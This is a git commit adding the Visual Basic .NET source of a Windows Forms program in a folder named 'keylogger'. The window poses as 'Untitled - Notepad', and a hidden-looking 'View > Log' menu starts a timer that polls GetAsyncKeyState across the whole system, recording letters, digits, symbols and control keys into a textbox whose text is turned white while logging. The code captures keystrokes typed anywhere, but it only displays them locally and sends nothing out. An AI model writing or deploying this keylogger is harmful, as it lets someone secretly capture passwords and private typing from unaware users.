3ec6a003bde658df96cb1efc43c691904f081010
Akshansh <akshanshkmr821@gmail.com>
2021-01-17 23:07:24 +0530

    refactoring code

---
+++ keylogger/Form1.Designer.vb
@@ -0,0 +1,138 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()>
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()>
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.MenuStrip1 = New System.Windows.Forms.MenuStrip()
+        Me.FileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.EditToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.FormatToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.ViewToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.LogToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.StopToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
+        Me.HelpToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.MenuStrip1.SuspendLayout()
+        Me.SuspendLayout()
+        '
+        'Timer1
+        '
+        Me.Timer1.Interval = 200
+        '
+        'TextBox1
+        '
+        Me.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None
+        Me.TextBox1.Dock = System.Windows.Forms.DockStyle.Fill
+        Me.TextBox1.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.TextBox1.Location = New System.Drawing.Point(0, 24)
+        Me.TextBox1.Multiline = True
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.Size = New System.Drawing.Size(659, 354)
+        Me.TextBox1.TabIndex = 0
+        '
+        'MenuStrip1
+        '
+        Me.MenuStrip1.BackColor = System.Drawing.SystemColors.Window
+        Me.MenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FileToolStripMenuItem, Me.EditToolStripMenuItem, Me.FormatToolStripMenuItem, Me.ViewToolStripMenuItem, Me.HelpToolStripMenuItem})
+        Me.MenuStrip1.Location = New System.Drawing.Point(0, 0)
+        Me.MenuStrip1.Name = "MenuStrip1"
+        Me.MenuStrip1.Size = New System.Drawing.Size(659, 24)
+        Me.MenuStrip1.TabIndex = 1
+        Me.MenuStrip1.Text = "MenuStrip1"
+        '
+        'FileToolStripMenuItem
+        '
+        Me.FileToolStripMenuItem.Name = "FileToolStripMenuItem"
+        Me.FileToolStripMenuItem.Size = New System.Drawing.Size(37, 20)
+        Me.FileToolStripMenuItem.Text = "File"
+        '
+        'EditToolStripMenuItem
+        '
+        Me.EditToolStripMenuItem.Name = "EditToolStripMenuItem"
+        Me.EditToolStripMenuItem.Size = New System.Drawing.Size(39, 20)
+        Me.EditToolStripMenuItem.Text = "Edit"
+        '
+        'FormatToolStripMenuItem
+        '
+        Me.FormatToolStripMenuItem.Name = "FormatToolStripMenuItem"
+        Me.FormatToolStripMenuItem.Size = New System.Drawing.Size(57, 20)
+        Me.FormatToolStripMenuItem.Text = "Format"
+        '
+        'ViewToolStripMenuItem
+        '
+        Me.ViewToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LogToolStripMenuItem, Me.StopToolStripMenuItem1})
+        Me.ViewToolStripMenuItem.Name = "ViewToolStripMenuItem"
+        Me.ViewToolStripMenuItem.Size = New System.Drawing.Size(44, 20)
+        Me.ViewToolStripMenuItem.Text = "View"
+        '
+        'LogToolStripMenuItem
+        '
+        Me.LogToolStripMenuItem.Name = "LogToolStripMenuItem"
+        Me.LogToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
+        Me.LogToolStripMenuItem.Text = "Log"
+        '
+        'StopToolStripMenuItem1
+        '
+        Me.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1"
+        Me.StopToolStripMenuItem1.Size = New System.Drawing.Size(180, 22)
+        Me.StopToolStripMenuItem1.Text = "Stop"
+        '
+        'HelpToolStripMenuItem
+        '
+        Me.HelpToolStripMenuItem.Name = "HelpToolStripMenuItem"
+        Me.HelpToolStripMenuItem.Size = New System.Drawing.Size(44, 20)
+        Me.HelpToolStripMenuItem.Text = "Help"
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(659, 378)
+        Me.Controls.Add(Me.TextBox1)
+        Me.Controls.Add(Me.MenuStrip1)
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.MainMenuStrip = Me.MenuStrip1
+        Me.Name = "Form1"
+        Me.RightToLeft = System.Windows.Forms.RightToLeft.No
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "Untitled - Notepad"
+        Me.MenuStrip1.ResumeLayout(False)
+        Me.MenuStrip1.PerformLayout()
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents Timer1 As Timer
+    Friend WithEvents TextBox1 As TextBox
+    Friend WithEvents MenuStrip1 As MenuStrip
+    Friend WithEvents FileToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents EditToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents FormatToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents ViewToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents HelpToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents LogToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents StopToolStripMenuItem1 As ToolStripMenuItem
+End Class
---
+++ keylogger/Form1.vb
@@ -0,0 +1,319 @@
+﻿Imports System.Runtime.InteropServices
+Public Class Form1
+
+    Public Declare Function GetAsyncKeyState Lib "user32" Alias "GetAsyncKeyState" (ByVal vKey As Integer) As Integer
+
+    Dim log As String
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        If My.Computer.Keyboard.ShiftKeyDown Then
+            If (GetAsyncKeyState(192)) Then
+                log = log + "~"
+            ElseIf (GetAsyncKeyState(189)) Then
+                log = log + "_"
+            ElseIf (GetAsyncKeyState(187)) Then
+                log = log + "+"
+            ElseIf (GetAsyncKeyState(219)) Then
+                log = log + "{"
+            ElseIf (GetAsyncKeyState(221)) Then
+                log = log + "}"
+            ElseIf (GetAsyncKeyState(186)) Then
+                log = log + ":"
+            ElseIf (GetAsyncKeyState(222)) Then
+                log = log + """"
+            ElseIf (GetAsyncKeyState(220)) Then
+                log = log + "|"
+            ElseIf (GetAsyncKeyState(188)) Then
+                log = log + "<"
+            ElseIf (GetAsyncKeyState(190)) Then
+                log = log + ">"
+            ElseIf (GetAsyncKeyState(191)) Then
+                log = log + "?"
+            ElseIf (GetAsyncKeyState(48)) Then
+                log = log + ")"
+            ElseIf (GetAsyncKeyState(49)) Then
+                log = log + "!"
+            ElseIf (GetAsyncKeyState(50)) Then
+                log = log + "@"
+            ElseIf (GetAsyncKeyState(51)) Then
+                log = log + "#"
+            ElseIf (GetAsyncKeyState(52)) Then
+                log = log + "$"
+            ElseIf (GetAsyncKeyState(53)) Then
+                log = log + "%"
+            ElseIf (GetAsyncKeyState(54)) Then
+                log = log + "^"
+            ElseIf (GetAsyncKeyState(55)) Then
+                log = log + "&"
+            ElseIf (GetAsyncKeyState(56)) Then
+                log = log + "*"
+            ElseIf (GetAsyncKeyState(57)) Then
+                log = log + "("
+            ElseIf (GetAsyncKeyState(65)) Then
+                log = log + "A"
+            ElseIf (GetAsyncKeyState(66)) Then
+                log = log + "B"
+            ElseIf (GetAsyncKeyState(67)) Then
+                log = log + "C"
+            ElseIf (GetAsyncKeyState(68)) Then
+                log = log + "D"
+            ElseIf (GetAsyncKeyState(69)) Then
+                log = log + "E"
+            ElseIf (GetAsyncKeyState(70)) Then
+                log = log + "F"
+            ElseIf (GetAsyncKeyState(71)) Then
+                log = log + "G"
+            ElseIf (GetAsyncKeyState(72)) Then
+                log = log + "H"
+            ElseIf (GetAsyncKeyState(73)) Then
+                log = log + "I"
+            ElseIf (GetAsyncKeyState(74)) Then
+                log = log + "J"
+            ElseIf (GetAsyncKeyState(75)) Then
+                log = log + "K"
+            ElseIf (GetAsyncKeyState(76)) Then
+                log = log + "L"
+            ElseIf (GetAsyncKeyState(77)) Then
+                log = log + "M"
+            ElseIf (GetAsyncKeyState(78)) Then
+                log = log + "N"
+            ElseIf (GetAsyncKeyState(79)) Then
+                log = log + "O"
+            ElseIf (GetAsyncKeyState(80)) Then
+                log = log + "P"
+            ElseIf (GetAsyncKeyState(81)) Then
+                log = log + "Q"
+            ElseIf (GetAsyncKeyState(82)) Then
+                log = log + "R"
+            ElseIf (GetAsyncKeyState(83)) Then
+                log = log + "S"
+            ElseIf (GetAsyncKeyState(84)) Then
+                log = log + "T"
+            ElseIf (GetAsyncKeyState(85)) Then
+                log = log + "U"
+            ElseIf (GetAsyncKeyState(86)) Then
+                log = log + "V"
+            ElseIf (GetAsyncKeyState(87)) Then
+                log = log + "W"
+            ElseIf (GetAsyncKeyState(88)) Then
+                log = log + "X"
+            ElseIf (GetAsyncKeyState(89)) Then
+                log = log + "Y"
+            ElseIf (GetAsyncKeyState(90)) Then
+                log = log + "Z"
+            End If
+        ElseIf My.Computer.Keyboard.CapsLock Then
+            If (GetAsyncKeyState(65)) Then
+                log = log + "A"
+            ElseIf (GetAsyncKeyState(66)) Then
+                log = log + "B"
+            ElseIf (GetAsyncKeyState(67)) Then
+                log = log + "C"
+            ElseIf (GetAsyncKeyState(68)) Then
+                log = log + "D"
+            ElseIf (GetAsyncKeyState(69)) Then
+                log = log + "E"
+            ElseIf (GetAsyncKeyState(70)) Then
+                log = log + "F"
+            ElseIf (GetAsyncKeyState(71)) Then
+                log = log + "G"
+            ElseIf (GetAsyncKeyState(72)) Then
+                log = log + "H"
+            ElseIf (GetAsyncKeyState(73)) Then
+                log = log + "I"
+            ElseIf (GetAsyncKeyState(74)) Then
+                log = log + "J"
+            ElseIf (GetAsyncKeyState(75)) Then
+                log = log + "K"
+            ElseIf (GetAsyncKeyState(76)) Then
+                log = log + "L"
+            ElseIf (GetAsyncKeyState(77)) Then
+                log = log + "M"
+            ElseIf (GetAsyncKeyState(78)) Then
+                log = log + "N"
+            ElseIf (GetAsyncKeyState(79)) Then
+                log = log + "O"
+            ElseIf (GetAsyncKeyState(80)) Then
+                log = log + "P"
+            ElseIf (GetAsyncKeyState(81)) Then
+                log = log + "Q"
+            ElseIf (GetAsyncKeyState(82)) Then
+                log = log + "R"
+            ElseIf (GetAsyncKeyState(83)) Then
+                log = log + "S"
+            ElseIf (GetAsyncKeyState(84)) Then
+                log = log + "T"
+            ElseIf (GetAsyncKeyState(85)) Then
+                log = log + "U"
+            ElseIf (GetAsyncKeyState(86)) Then
+                log = log + "V"
+            ElseIf (GetAsyncKeyState(87)) Then
+                log = log + "W"
+            ElseIf (GetAsyncKeyState(88)) Then
+                log = log + "X"
+            ElseIf (GetAsyncKeyState(89)) Then
+                log = log + "Y"
+            ElseIf (GetAsyncKeyState(90)) Then
+                log = log + "Z"
+            End If
+        Else
+            If (GetAsyncKeyState(65)) Then
+                log = log + "a"
+            ElseIf (GetAsyncKeyState(66)) Then
+                log = log + "b"
+            ElseIf (GetAsyncKeyState(67)) Then
+                log = log + "c"
+            ElseIf (GetAsyncKeyState(68)) Then
+                log = log + "d"
+            ElseIf (GetAsyncKeyState(69)) Then
+                log = log + "e"
+            ElseIf (GetAsyncKeyState(70)) Then
+                log = log + "f"
+            ElseIf (GetAsyncKeyState(71)) Then
+                log = log + "g"
+            ElseIf (GetAsyncKeyState(72)) Then
+                log = log + "h"
+            ElseIf (GetAsyncKeyState(73)) Then
+                log = log + "i"
+            ElseIf (GetAsyncKeyState(74)) Then
+                log = log + "j"
+            ElseIf (GetAsyncKeyState(75)) Then
+                log = log + "k"
+            ElseIf (GetAsyncKeyState(76)) Then
+                log = log + "l"
+            ElseIf (GetAsyncKeyState(77)) Then
+                log = log + "m"
+            ElseIf (GetAsyncKeyState(78)) Then
+                log = log + "n"
+            ElseIf (GetAsyncKeyState(79)) Then
+                log = log + "o"
+            ElseIf (GetAsyncKeyState(80)) Then
+                log = log + "p"
+            ElseIf (GetAsyncKeyState(81)) Then
+                log = log + "q"
+            ElseIf (GetAsyncKeyState(82)) Then
+                log = log + "r"
+            ElseIf (GetAsyncKeyState(83)) Then
+                log = log + "s"
+            ElseIf (GetAsyncKeyState(84)) Then
+                log = log + "t"
+            ElseIf (GetAsyncKeyState(85)) Then
+                log = log + "u"
+            ElseIf (GetAsyncKeyState(86)) Then
+                log = log + "v"
+            ElseIf (GetAsyncKeyState(87)) Then
+                log = log + "w"
+            ElseIf (GetAsyncKeyState(88)) Then
+                log = log + "x"
+            ElseIf (GetAsyncKeyState(89)) Then
+                log = log + "y"
+            ElseIf (GetAsyncKeyState(90)) Then
+                log = log + "z"
+            ElseIf (GetAsyncKeyState(48)) Then
+                log = log + "0"
+            ElseIf (GetAsyncKeyState(49)) Then
+                log = log + "1"
+            ElseIf (GetAsyncKeyState(50)) Then
+                log = log + "2"
+            ElseIf (GetAsyncKeyState(51)) Then
+                log = log + "3"
+            ElseIf (GetAsyncKeyState(52)) Then
+                log = log + "4"
+            ElseIf (GetAsyncKeyState(53)) Then
+                log = log + "5"
+            ElseIf (GetAsyncKeyState(54)) Then
+                log = log + "6"
+            ElseIf (GetAsyncKeyState(55)) Then
+                log = log + "7"
+            ElseIf (GetAsyncKeyState(56)) Then
+                log = log + "8"
+            ElseIf (GetAsyncKeyState(57)) Then
+                log = log + "9"
+            ElseIf (GetAsyncKeyState(96)) Then
+                log = log + "{Num0}"
+            ElseIf (GetAsyncKeyState(97)) Then
+                log = log + "{Num1}"
+            ElseIf (GetAsyncKeyState(98)) Then
+                log = log + "{Num2}"
+            ElseIf (GetAsyncKeyState(99)) Then
+                log = log + "{Num3}"
+            ElseIf (GetAsyncKeyState(100)) Then
+                log = log + "{Num4}"
+            ElseIf (GetAsyncKeyState(101)) Then
+                log = log + "{Num5}"
+            ElseIf (GetAsyncKeyState(102)) Then
+                log = log + "{Num6}"
+            ElseIf (GetAsyncKeyState(103)) Then
+                log = log + "{Num7}"
+            ElseIf (GetAsyncKeyState(104)) Then
+                log = log + "{Num8}"
+            ElseIf (GetAsyncKeyState(105)) Then
+                log = log + "{Num9}"
+            ElseIf (GetAsyncKeyState(106)) Then
+                log = log + "{Num*}"
+            ElseIf (GetAsyncKeyState(107)) Then
+                log = log + "{Num+}"
+            ElseIf (GetAsyncKeyState(13)) Then
+                log = log + "{Enter}"
+            ElseIf (GetAsyncKeyState(109)) Then
+                log = log + "{Num-}"
+            ElseIf (GetAsyncKeyState(110)) Then
+                log = log + "{Num.}"
+            ElseIf (GetAsyncKeyState(111)) Then
+                log = log + "{Num/}"
+            ElseIf (GetAsyncKeyState(32)) Then
+                log = log + " "
+            ElseIf (GetAsyncKeyState(8)) Then
+                log = log + "{Backspace}"
+            ElseIf (GetAsyncKeyState(9)) Then
+                log = log + "{Tab}"
+                'ElseIf (GetAsyncKeyState(16)) Then
+                'log = log + "{Shift}"
+            ElseIf (GetAsyncKeyState(17)) Then
+                log = log + "{Control}"
+            ElseIf (GetAsyncKeyState(27)) Then
+                log = log + "{Esc}"
+            ElseIf (GetAsyncKeyState(45)) Then
+                log = log + "{Insert}"
+            ElseIf (GetAsyncKeyState(46)) Then
+                log = log + "{Del}"
+            ElseIf (GetAsyncKeyState(144)) Then
+                log = log + "{NumLock}"
+            ElseIf (GetAsyncKeyState(192)) Then
+                log = log + "`"
+            ElseIf (GetAsyncKeyState(189)) Then
+                log = log + "-"
+            ElseIf (GetAsyncKeyState(187)) Then
+                log = log + "="
+            ElseIf (GetAsyncKeyState(219)) Then
+                log = log + "["
+            ElseIf (GetAsyncKeyState(221)) Then
+                log = log + "]"
+            ElseIf (GetAsyncKeyState(186)) Then
+                log = log + ";"
+            ElseIf (GetAsyncKeyState(222)) Then
+                log = log + "'"
+            ElseIf (GetAsyncKeyState(220)) Then
+                log = log + "\"
+            ElseIf (GetAsyncKeyState(188)) Then
+                log = log + ","
+            ElseIf (GetAsyncKeyState(190)) Then
+                log = log + "."
+            ElseIf (GetAsyncKeyState(191)) Then
+                log = log + "/"
+            End If
+        End If
+        TextBox1.Text = log
+    End Sub
+
+    Private Sub LogToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LogToolStripMenuItem.Click
+        Timer1.Start()
+        TextBox1.ForeColor = Color.White
+    End Sub
+
+    Private Sub StopToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem1.Click
+        Timer1.Stop()
+        TextBox1.ForeColor = Color.Black
+    End Sub
+
+End Class
